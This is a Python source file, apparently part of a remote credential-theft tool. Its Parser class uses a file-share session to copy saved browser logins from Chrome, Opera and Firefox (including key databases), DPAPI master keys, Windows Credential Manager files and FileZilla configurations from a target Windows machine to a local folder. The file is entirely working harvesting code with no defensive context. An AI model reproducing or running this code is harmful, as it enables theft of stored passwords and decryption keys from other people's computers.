import os


class Parser:
    def __init__(self, source, destination, session, volume):
        super(Parser, self).__init__()
        self.source = source
        self.destination = destination
        self.session = session
        self.volume = volume
        self.paths = ['/AppData/Roaming/Microsoft/Protect/', '/AppData/Local/Google/Chrome/User Data/', '/Windows'
                                                                                                        '/System32'
                                                                                                        '/Microsoft'
                                                                                                        '/Protect/',
                      '/AppData/Roaming/Mozilla/Firefox/Profiles/',
                      '/AppData/Roaming/Opera Software/Opera Stable/', '/AppData/Roaming/FileZilla/']
        self.denied_paths = ['.', '..', 'Recovery']
        self.firefox_files = ['logins.json', 'key4.db', 'key3.db', 'signons.sqlite']
        self.creds_locations = ['/AppData/Local/Microsoft/Credentials/', '/AppData/Roaming/Microsoft/Credentials/', '/ProgramData/Microsoft/Credentials/', '/Windows/System32/config/systemprofile/AppData/Roaming/Microsoft/Credentials/']

    def Chrome(self, flog='', log=''):
        Browser_folders = []
        try:
            path = f'{self.destination}/Chrome/'
            if not os.path.exists(path):
                os.mkdir(path)
            Folders = self.session.listPath(self.volume, self.source + self.paths[1], search=0x10)
            for Folder in Folders:
                if Folder.filename == 'Default' or Folder.filename[:-2] == 'Profile':
                    Browser_folders.append(Folder.filename)
            for i in range(len(Browser_folders) + 1):
                if i == len(Browser_folders):
                    save_pth = path + 'Local State'
                    remote_pth = self.source + self.paths[1] + 'Local State'
                else:
                    if not os.path.exists(path + Browser_folders[i]):
                        os.mkdir(path + Browser_folders[i])
                    save_pth = path + Browser_folders[i] + '/Login Data'
                    remote_pth = self.source + self.paths[1] + Browser_folders[i] + '/Login Data'
                with open(save_pth, 'wb') as fp:
                    self.session.retrieveFile(self.volume,
                                              remote_pth,
                                              fp)
            if len(Browser_folders) == 0:
                raise
            else:
                log += 'Download Chrome data SUCCESS'
                flog += 'Download Chrome data SUCCESS'
        except Exception as error:
            flog += f'Error get Chrome data\n{"=" * 50}\n{error}\n{"=" * 50}'
            log += 'Error get Chrome data'
        finally:
            return [log, flog]

    def SSID(self, flog='', log=''):
        if not os.path.exists(f'{self.destination}/user_ssid'):
            os.mkdir(f'{self.destination}/user_ssid')
        try:
            Folders = self.session.listPath(self.volume, self.source + self.paths[0], search=0x10)
            for SSID in Folders:
                if SSID.filename not in self.denied_paths:
                    path = f'{self.destination}/user_ssid/{SSID.filename}'
                    if not os.path.exists(path):
                        os.mkdir(path)
                    Files = self.session.listPath(self.volume, self.source + self.paths[0] + f'/{SSID.filename}',
                                                  search=0x04)
                    for MK in Files:
                        if MK.filename not in self.denied_paths:
                            with open(f'{path}/{MK.filename}', 'wb') as fp:
                                self.session.retrieveFile(self.volume,
                                                          self.source + self.paths[
                                                              0] + f'{SSID.filename}/{MK.filename}',
                                                          fp)
            log += 'Download SSID data SUCCESS'
            flog += 'Download SSID data SUCCESS'
        except Exception as error:
            flog += f'Error get SSID data\n{"=" * 50}\n{error}\n{"=" * 50}'
            log += 'Error get SSID data'
        finally:
            return [log, flog]

    def SYS_SSID(self, flog='', log=''):
        root_folders = []
        flag = False
        flag_1 = False
        if not os.path.exists(f'{self.destination}/sys_ssid'):
            os.mkdir(f'{self.destination}/sys_ssid')
        try:
            Folders = self.session.listPath(self.volume, self.paths[2], search=0x10)
            for i in Folders:
                if i.filename not in self.denied_paths:
                    root_folders.append(i.filename)
            for i in root_folders:
                while True:
                    if not flag:
                        local_path = f'{self.destination}/sys_ssid/{i}'
                        remote_path = self.paths[2] + f'/{i}'
                    if not os.path.exists(local_path):
                        os.mkdir(local_path)
                    Files = self.session.listPath(self.volume, remote_path)
                    for MK in Files:
                        if MK.filename not in self.denied_paths and not MK.isDirectory:
                            with open(f'{local_path}/{MK.filename}', 'wb') as fp:
                                self.session.retrieveFile(self.volume, f'{remote_path}/{MK.filename}', fp)
                    Folders = self.session.listPath(self.volume, remote_path, search=0x10)
                    for g in Folders:
                        if g.filename not in self.denied_paths:
                            flag = True
                            flag_1 = True
                            local_path += f'/{g.filename}'
                            remote_path += f'/{g.filename}'
                            break
                    if flag_1:
                        flag_1 = False
                    else:
                        flag = False
                        break
            log += 'Download SYS_SSID data SUCCESS'
            flog += 'Download SYS_SSID data SUCCESS'
        except Exception as error:
            flog += f'Error get SYS_SSID data\n{"=" * 50}\n{error}\n{"=" * 50}'
            log += 'Error get SYS_SSID data'
        finally:
            return [log, flog]

    def Vault(self, flog='', log='', c=0):
        local_pth = f'{self.destination}/Creds'
        if not os.path.exists(local_pth):
            os.mkdir(local_pth)
        for path in range(len(self.creds_locations)):
            if path > 1:
                remote_pth = self.creds_locations[path]
            else:
                remote_pth = self.source + self.creds_locations[path]
            try:
                Files = self.session.listPath(self.volume, remote_pth)
                for MK in Files:
                    if MK.filename not in self.denied_paths:
                        with open(f'{local_pth}/{MK.filename}', 'wb') as fp:
                            self.session.retrieveFile(self.volume,
                                                        f'{remote_pth}/{MK.filename}',
                                                        fp)
            except:
                c += 1
        if c < 4:
            log += 'Download Creds data SUCCESS'
            flog += 'Download Creds data SUCCESS'
        else:
            flog += f'Error get Creds data\n{"=" * 50}\nPATHS NOT FOUND\n{"=" * 50}'
            log += 'Error get Creds data'
        return [log, flog]

    def FireFox(self, flog='', log=''):
        if not os.path.exists(f'{self.destination}/FireFox'):
            os.mkdir(f'{self.destination}/FireFox')
        try:
            Folders = self.session.listPath(self.volume, self.source + self.paths[3], search=0x10)
            for folder in Folders:
                if folder.filename not in self.denied_paths:
                    path = f'{self.destination}/FireFox/{folder.filename}'
                    if not os.path.exists(path):
                        os.mkdir(path)
                    for file in self.firefox_files:
                        try:
                            with open(f'{path}/{file}', 'wb') as fp:
                                self.session.retrieveFile(self.volume,
                                                          self.source + self.paths[3] + f'{folder.filename}/{file}', fp)
                        except:
                            os.remove(f'{path}/{file}')
            log += 'Downloading FireFox data SUCCESS'
            flog += 'Downloading FireFox data SUCCESS'
        except Exception as error:
            flog += f'Error get FireFox data\n{"=" * 50}\n{error}\n{"=" * 50}'
            log += 'Error get FireFox data'
        finally:
            return [log, flog]

    def Opera(self, flog='', log=''):
        Browser_folders = []
        try:
            path = f'{self.destination}/Opera/'
            if not os.path.exists(path):
                os.mkdir(path)
            Folders = self.session.listPath(self.volume, self.source + self.paths[4], search=0x10)
            for Folder in Folders:
                if Folder.filename == 'Default' or Folder.filename[:-2] == 'Profile':
                    Browser_folders.append(Folder.filename)
            for i in range(len(Browser_folders) + 1):
                if i == len(Browser_folders):
                    save_pth = path + 'Local State'
                    remote_pth = self.source + self.paths[4] + 'Local State'
                else:
                    if not os.path.exists(path + Browser_folders[i]):
                        os.mkdir(path + Browser_folders[i])
                    save_pth = path + Browser_folders[i] + '/Login Data'
                    remote_pth = self.source + self.paths[4] + Browser_folders[i] + '/Login Data'
                with open(save_pth, 'wb') as fp:
                    self.session.retrieveFile(self.volume,
                                              remote_pth,
                                              fp)
            if len(Browser_folders) == 0:
                raise
            else:
                flog += 'Download Opera data SUCCESS'
                log += 'Download Opera data SUCCESS'
        except Exception as error:
            flog += f'Error get Opera data\n{"=" * 50}\n{error}\n{"=" * 50}'
            log += 'Error get Opera data'
        finally:
            return [log, flog]

    def FileZilla(self, flog='', log=''):
        path = f'{self.destination}/FileZilla'
        if not os.path.exists(path):
            os.mkdir(path)
        try:
            Files = self.session.listPath(self.volume, self.source + self.paths[5])
            for file in Files:
                if file.filename not in self.denied_paths:
                    with open(f'{path}/{file.filename}', 'wb') as fp:
                        self.session.retrieveFile(self.volume, self.source + self.paths[5] + f'{file.filename}', fp)
            flog += 'Downloading FileZilla data SUCCESS'
            log += 'Downloading FileZilla data SUCCESS'
        except Exception as error:
            flog += f'Error get FileZilla data\n{"=" * 50}\n{error}\n{"=" * 50}'
            log += 'Error get FileZilla data'
        finally:
            return [log, flog]
